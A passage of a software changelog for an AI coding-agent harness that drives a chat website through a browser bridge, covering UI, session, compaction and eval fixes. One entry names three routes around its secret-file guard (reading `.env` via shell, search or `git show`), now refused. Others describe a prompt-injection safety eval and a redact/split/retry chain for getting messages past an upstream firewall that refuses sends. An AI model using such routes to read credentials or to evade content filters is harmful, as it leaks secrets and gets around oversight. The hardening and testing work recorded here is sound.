  under the plugin that draws them, where a finished run still repaints them in
  place. Nothing was dropped: `/skills` still lists the playbooks, and the
  plugin panels are drawn the moment the sheet opens
  (`desktop/ui/index.html`, `desktop/ui/app.js`, `desktop/ui/styles.css`,
  `test/ui.test.mjs`).

- **The rail is the work, not the configuration.** The window's left column
  carried nine rows, and half of them led nowhere: "ค้นหาแชท" focused a search
  box folded away inside another row, so clicking it did nothing you could
  see; "ผู้ช่วยอัจฉริยะ" focused the composer, which is already focused;
  "ไฟล์เดี่ยว" duplicated the attach button beside it; a "New Conversation"
  line duplicated the button above it; and "เรียนรู้เกี่ยวกับ AI" held an
  empty box unless a plugin happened to be installed. The rail is now
  แชทใหม่, the search field itself, the history (counted, searchable, scrolling
  in its own box), the project's files, and the playbooks and plugin panels —
  shown only when they have something in them, so a section with nothing in it
  is not a row that leads nowhere. What the app remembers between sessions
  moved to a settings page, next to the rules, because that is where you look
  when you ask what an app is doing; the foot of the column spells out ตั้งค่า
  and วิธีใช้ rather than leaving a 15px gear in the header. The one-click
  archive of old conversations was invisible — the hover-to-reveal rule belongs
  to the file rows' แนบ button — and it stays visible now
  (`desktop/ui/*`, `test/ui.test.mjs`).

- **The safety twins were measured, and the first experiment graduated.**
  `safety-twin-controls` ran its 3 live attempts of the safety set on
  2026-10-20: 12/12 solved, 0 false positives, 0 false negatives — the clean
  RUN went through every time, the embedded instruction was ignored every
  time, `.env` stayed untouched, and the secret request ended denied
  (`evals/results/2026-10-20T04-38-38-891-live.jsonl`, attempt sessions kept
  beside it). The record is `done` with that result pinned; the queue's other
  seven records stay `proposed`.
- **The plan card tracks the run and says what is left.** The `finished`
  event now carries the run's final `todo` state, so the window re-tallies the
  card from one account: a `done` ending with items still open names how many
  and offers the one-click carry-on, a fully ticked card shows `done/total`
  and marks itself complete, the list is height-bounded and scrolls instead of
  covering the conversation, and the card is cleared — and replayed from the
  session log — when the conversation changes (`test/plan.test.mjs`,
  `test/ui.test.mjs`).
- **A DONE that leaves the plan open is asked about exactly once.** When a
  DONE arrives while the run's own checklist still has open items, the loop
  sends one message that names them (up to 8, then "… and N more") and asks
  the model to finish, tick or drop each — and a second DONE after it always
  ends the run, so the checkpoint can never park a long run on a checklist
  nobody answers. The asks are counted in `run_stats.todoPrompts`
  (`test/plan.test.mjs`).
- **A session owns its model-side conversation.** The conversation id is
  recorded on the session header the moment it has taken a message, adopted
  when the session is reopened (a warm resume — the upstream still holds the
  history), and never carried across sessions: `/new`, `/resume` or a
  `session.open` on another session used to keep talking in whatever
  conversation the harness was last on, putting one session's messages into
  another's history. A session reopened without its conversation — an old
  file, a fresh process — gets a bounded digest of its own transcript as the
  fresh conversation's seed (tasks given, the model's last words, the open
  checklist, the durable facts), records the boundary like a rotation so the
  budget estimate measures what the model actually holds, and a conversation
  that is gone upstream (a temporary that expired) is replaced with a fresh
  one plus the same digest instead of ending the run
  (`test/session-resume.test.mjs`, `test/data-integrity.test.mjs`).
- `evals:compare` no longer passes by absence: a baseline task the candidate
  never ran counts as 0 rows and fails as insufficient sample, the same way a
  missing safety task already did (`docs/SPEC_EVALS.md` says it in the gate
  text too).
- Session load is explicit about bad data: a duplicated entry id loads once,
  lines that parse to the wrong type are skipped, and only an object with a
  string `id` counts as a header.
- `docs/SPEC_EVALS.md` no longer claims the loop lacks wall-clock caps (it
  does not lack them; the credit cap was the missing one, and now ships
  opt-in). Open question 2 (attempt policy) is resolved as built.
- `compaction` entries record the newest entry their summary folds away as
  `lastSummarizedEntryId` — the old `firstKeptEntryId` named the wrong end of
  the boundary (`docs/DATA_FORMATS.md` notes the old spelling). The `seed()`
  helper's never-read `listing` parameter is gone.
- **Per-model context budgets finally drive compaction.** `Compactor` already
  knew how to pick a budget by model id (prefix match); the desktop path now
  passes a curated map (flash 100k, pro/sonnet/opus/gpt 200k, deepseek/qwen/
  llama/mistral/grok 128k, gemini 1M) instead of a flat 24k, and a new
  `maxResult` setting (default 3000) reaches the tool context from the sheet
  too (`test/compact.test.mjs`, `test/settings-clamp.test.mjs`).
- **A follow-up task stops re-pasting an unchanged top-level listing.** The
  harness keeps a per-conversation memory of the listing each conversation was
  last shown (`Harness#listingShown`, `loop.mjs`); an identical listing is
  answered with a one-line "unchanged" note, while a created, rotated or
  freshly pinned conversation gets the full table. The memory is written only
  after the message carrying the listing was accepted — never at composition
  time (`test/agent.test.mjs`, `test/compact.test.mjs`).
- **A long-lived backend keeps less alive.** Switching projects closes the MCP
  clients of the harness left behind — idle child processes used to collect one
  set per project the backend ever ran in — and they respawn on the next use.
  The `run` call also pins the harness it landed on: between its awaits,
  another window's project switch used to be able to repoint the run's next
  attempt, its policy and its pending list (`test/desktop.test.mjs`).

### Fixed

- **Node 22 is the floor, stated everywhere.** `engines` has said `>=22` since
  the type-check seed, while the installers, `aipass status`, the setup doctor
  and `aipass-bridge/package.json` still said `>=20`. They all say 22 now,
  matching the CI matrix (22/24) and the September 2026 runner floor. The
  README badge already said 22.
- **A ticked checklist item actually ticks.** `parseTodo` matched `done`
  against the bulleted line, so `- [x] text` — the shape every model writes —
  parsed as open forever: the card never showed progress and the DONE plan
  checkpoint saw the whole plan outstanding even when it was not. The bullet
  is stripped before the checkbox is judged (`test/plan.test.mjs`).
- **The plan card holds still while it updates, and the window cannot be
  raced into a mixed session.** Ticking one item rebuilt the whole list on
  every step — a flicker that reset the card's scroll position mid-read — and
  a `todo` frame without items threw inside the stream handler, mid-run; an
  unchanged row now updates where it stands, the scroll survives a rebuild,
  and junk frames are dropped. Opening a session is async too: two quick
  clicks interleaved their entries into one transcript, and a load still in
  flight painted over a freshly started New Conversation; the newest choice
  now owns the screen (`test/ui.test.mjs`).
- **A live run cannot paint into another session's view.** Opening an old
  conversation while a run was in flight let the run write into it: streamed
  prose into someone else's transcript, its checklist card over it, its
  `finished` folding a trail that was not on screen. The backend tags every
  harness frame with the session the run writes to — read at the run's start,
  so a `session.open` moving the harness mid-run does not move the tag — and
  the window drops frames tagged for another session. The `session`
  announcement stays exempt: adopting the new id is how the window follows a
  run that opens a session (`test/desktop.test.mjs`, `test/ui.test.mjs`).
- **A timed-out `RUN` or `GIT` takes its whole process tree down.** `exec`'s
  timeout killed the shell alone, so the command's own children — a server it
  started, a watcher — outlived it and kept holding the files they had open;
  a later `RUN` met "EBUSY" from a process nobody could see. One runner
  (`runShell`, `tools.mjs`) now owns both tools: bounded output, the same
  `code`/`signal`/`stdout`/`stderr` rejection shape, and a timeout that kills
  the tree — `taskkill /T` on Windows, a process-group signal elsewhere
  (`test/stability.test.mjs` pins a grandchild that must never write).
- **A checklist keeps one row per step.** A line the model repeated inside
  one TODO update — or a duplicate an older build let into the state —
  rendered as two items: the count lied and the tick read as half done.
  `mergeTodo` folds repeated texts now, so the card and the DONE checkpoint
  agree on what is open (`test/plan.test.mjs`).
- **The tool activity is routed the same way with and without streaming.**
  `AIPASS_TOOL_VISIBILITY=text` put the tool activity inline in the streamed
  reply and in the reasoning field in the plain one, so the same request
  answered differently depending on how the client asked. Both go through one
  function now, and a `note` never rides in the content — it is a line for the
  person, not something a client may quote back as the answer.
- **An attachment-only message carries its text upstream.** The bridge
  computed a placeholder (`[notes.csv]`, `[Image]`) because the upstream
  composer rejects an empty message — but put it in the text field only, and
  the extension builds the upstream message from the parts and ignores the
  text whenever there are parts. The placeholder never reached the model, so
  the message went up as a bare attachment, which is the empty composer the
  placeholder was there to avoid.
- **A media frame with no payload no longer strands the job.** An empty media
  frame threw inside the delta handler, so the job was never settled and the
  client waited out the whole idle timeout; the flush runs in a timer, so the
  exception could take the bridge process with it.
- **The assistant the page created is reported back to the bridge.** The
  worker had no branch for the assistant reply, so the id was dropped on the
  floor: the job sat until it timed out, and the assistant was really created
  on the account all the same.
- **An error page is not carried back as if it were the media.** `fetch` does
  not reject on a 4xx or a 5xx, and the body of one is an error page — so a
  media URL that answered with one was carried inline as the picture, and a
  broken image tag was all the caller saw. A frame carrying `url: ""` beside a
  real `snapshotUrl` lost the media altogether.
- **An edit does not expand `$` patterns in the replacement.** `$$`, `$&` and
  `` $` `` are replacement patterns in `String.replace`, and the model writes
  shell scripts and JavaScript, where they are ordinary characters. An edit
  could land with bytes the model never wrote — while reporting the edit as
  applied.
- **Reading past the end of a file says so.** A range starting past the end
  produced an empty read and a note claiming "lines 500-100 of 100", which
  reads like the file is empty; and a file ending with a newline had a
  phantom last line, which the model copies under `FIND` and the edit then
  never matches.
- **A switch flag no longer swallows the task.** "A token that starts with
  `--` is a flag, and the token after it is its value" is only true for a flag
  that takes a value; for a switch it ate the task, so
  `npm run agent -- --apply "fix the bug"` printed the usage and exited. A
  flag given without a value keeps its default instead of handing back
  `undefined`, which crashed the caller outright.
- **A rotated conversation is seeded even when the run is not the session's
  first.** Between-runs compaction fires on exactly the runs that are not
  first, and the seed was gated on `first`: the fresh conversation restarted
  from a bare "the project is still open" message with the paid-for summary
  never sent. A manual `/compact` had the same hole from the other side — its
  summary had no run to ride in; the next run now builds the seed against its
  own task (`rememberSummary`), once.
- **A rotation that fails is no longer recorded as done.** The compaction
  entry is appended after `rotate()` succeeds (both the loop's mid-run path
  and `compactNow`), so the estimate can never reset against memory the model
  never carried, and a mid-run failure retries on the next step. `/compact`
  also refuses while a run is in flight rather than rotating under it.
- The compaction divisor sampled entries a rotation had already discarded, so
  a fresh Thai conversation following a large Latin one (or the reverse)
  estimated up to 2× off; it now samples the same window `estimate()` counts.
- **The session and upload stores are owner-only where the OS has modes.**
  Sessions, their per-project directories and staged upload copies are created
  0o700/0o600, and a file an older build wrote readable is tightened when it
  is opened — the sensitive store no longer hinges on the ambient umask.
  Windows keeps its profile ACL; the token file's modes were already pinned
  (`SECURITY.md`).
- A `compaction` entry with no summary rendered as `undefined` in the
  session's markdown export; it now renders `(no summary)`.
- `npm run evals:lint` was failing on master: `refuse-secret`'s check passed
  on its untouched tree (a no-leak-only check scores nothing). The check now
  requires the explicit `denied` ending, so fail-before holds for every one
  of the 111 checks and CI's lint is green again.
- **A closing message carries the answer.** The standing instructions now say
  the findings belong above the DONE — a question or a summary never closes
  with a "done summarizing" line while the substance stays inside a pasted
  web result — and the no-marker nudge says a written answer plus DONE is
  enough (`test/protocol.test.mjs`, `test/harness-fixes.test.mjs`). The
  math-fix replay fingerprint follows the new preamble
  (`evals/fixtures/math-fix-replay.json`).
- **The picker marks a model the live catalog dropped.** A saved model the
  site no longer offers used to sit in the dropdown unmarked and then failed
  the run at the catalog check; the option now carries that verdict before
  the run starts, and a model missing from a fallback list stays unjudged —
  the same rule the loop applies (`test/ui.test.mjs`).
- **A pace-score 403 cools the whole tab, not just the job it refused.** The
  edge 403s by pace as well as by content — the same limiter family as a 429 —
  but only the refused job used to wait: every send behind it left at full
  pace into the window that had just said no. The page now arms the tab-wide
  `rateQuietUntil` clock and the five-minute `RATE_MEMORY_MS` pacing on a 403
  exactly as on a 429 (`test/page.test.mjs`).
- **The settings sheet's budgets reach the live run the moment Save lands.**
  `maxToolCalls`, `maxWallClockMs` and `maxCredits` join the keys re-applied
  to the running harness on save — before this a budget change only took
  effect at the next backend start while the sheet said it was live
  (`test/hardening.test.mjs`).
- **The `models:` line covers history, not just new runs.** A run that
  predates `run_stats.model` is attributed to the model its session recorded
  — the one a fresh run started on — so older sessions no longer blend under
  `(unrecorded)`, which stays for sessions that recorded no model at all
  (`test/stats.test.mjs`).
- **A refused send no longer ends the run at the first exhaustion.** Past the
  redact/wait/split/omit chain the loop pauses and sends the same message
  again (`RECOVER_WAITS_MS` — 30s then 60s, bounded): the connection-cycle
  shapes, a tab still loading, rate windows, and 403s that were never about
  the content. Each recovery is a `firewall_note` and counts in
  `run_stats.sendRecoveries`; the transport also waits out a content script
  mid-reinjection (`TRANSIENT_SEND`), and a run that still dies keeps its
  recorded cause (`test/agent.test.mjs`).
- **Streaming stops repainting what it already painted.** A reply paints in two
  layers now — the settled blocks render once, only the unfinished tail
  re-renders per frame — and the reasoning fold appends the text that arrived
  instead of reassigning its whole body, so a long answer or a long think no
  longer slows the window as it grows (`test/ui-md.test.mjs`,
  `test/ui.test.mjs`).
- **The backend's big reads and walks no longer block the window.** GLOB's tree
  walk, SEARCH's per-entry size check, and attachment staging/sending used sync
  fs calls that froze every window request for their duration; they go through
  `fs.promises` now — the walk stays sequential, so the cap still returns the
  same files (`test/tools.test.mjs`, `test/tools-aci.test.mjs`).
- `docs/DATA_FORMATS.md` matches the code again: `maxSteps` defaults to 0 (no
  cap), `minThaiRatio` to 0.4, and the auth exemption list names the same
  routes the backend skips (`/token`, the static UI files).
- **GLOB speaks shell globs again.** Brace alternation (`*.{js,css,html}`)
  and `?` are expanded and matched the way the shells do; the braces were
  escaped before, so a tree full of matching files answered "no files matched"
  (`test/tools.test.mjs`).
- **The nudge names a broken marker.** When a reply contained marker-shaped
  text that did not parse, the correction now says so and lists the shape
  rules (start of its own line, no indentation, bold or code fence, exact
  keyword) instead of the generic "no marker" line.
- `RUN type .env`, `SEARCH` over `server.pem`, and `git show HEAD:.env` were
  three ways around the secret floor; all three are refused now
  (`test/secret-screen.test.mjs`).
- **A backend crash no longer masks itself as a `ReferenceError`.** The desktop
  backend's `fatal()` handler called `formatLogLine` without importing it, so
  every uncaught error exited as `ReferenceError: formatLogLine is not defined`
  and the real cause was lost — and the supervisor restarted the backend, making
  the crash look like a restart. The import is restored, so a crash now prints
  the error that caused it (`test/hardening.test.mjs`).
- **A project is a first-class scope in the window.** `state.root` is set from
  the project list/switch/snapshot, every run and cancel carries `root`, and
  events from other projects are dropped so a run in one project cannot paint
  another; a foreign permission/plan modal still shows, tagged with the other
  project's name, and its answer is routed back by project
  (`test/ui.test.mjs`).
- **A run is bound to its root.** `run(params)` switches the harness when
  `params.root` differs (remember:false), `cancel(params)` targets the named
  harness, and `status()` reports per-project `running`; the window sends
  `root: state.root` on run/cancel (`test/desktop.test.mjs`).
- **Helpers read the parent's staged tree.** `Overlay` gains a read-through
  `base` layer; a helper is built with `base: overlay` and its own `before`
  snapshot, and copy-back skips files staged since it started, naming them in
  `helper_end.skipped` (`test/harness-fixes.test.mjs`).
- **`readSet` is per run.** `#makeTools()` is called in `run()`, not shared,
  so a read in one run no longer licenses a blind CREATE in the next
  (`test/harness-fixes.test.mjs`).
- **Rotation keeps the conversation its `create` returned.** `#rotate` uses
  `made.id` instead of re-reading the bridge's shared pointer; the server's
  `resolveConversation` skips a temporary `conversationCache` for nameless
  callers; sends now carry `conversation`/`conversationTemporary` per send
  (including summarize), and the loop rebinds `conversation` after rotation
  (`test/harness-fixes.test.mjs`, `test/bridge.test.mjs`).

## [0.2.0]

The release this repository is at. The ground-up continuation, in buckets:

- **The window** (`desktop/`): Tauri shell, chat UI, settings sheet, diffs
  with apply/reject, session picker, plan mode, project switching.
- **The bridge** (`aipass-bridge/bridge/`): WAF-safe relay between the local
  harness and the logged-in chat tab, quota/models routes, admin routes
  behind `AIPASS_ADMIN=1`, loopback-only with a bearer token.
- **The harness**: the pi-style session JSONL, the marker tool protocol,
  permissions with the secret floor, the loop with its guards (stagnation,
  repeat, chain, verify), compaction, overlay/apply, and the apply-then-check
  discipline.
- **The Thai pack**: `replyLanguage`/language check, the Thai/English eval
  pair set, and Thai-first UI copy.
- **Hardening**: loopback token on every route, openers take argv only, one
  WAF table, one-run-per-harness lock.
- **Stability**: capped rotating logs, atomic session writes, spill pruning,
  crash handlers that name the death instead of vanishing.
- **Evals** (`npm run evals`): check-decides-outcome task fixtures, live and
  replay modes, fingerprints that mark stale replays instead of scoring them.
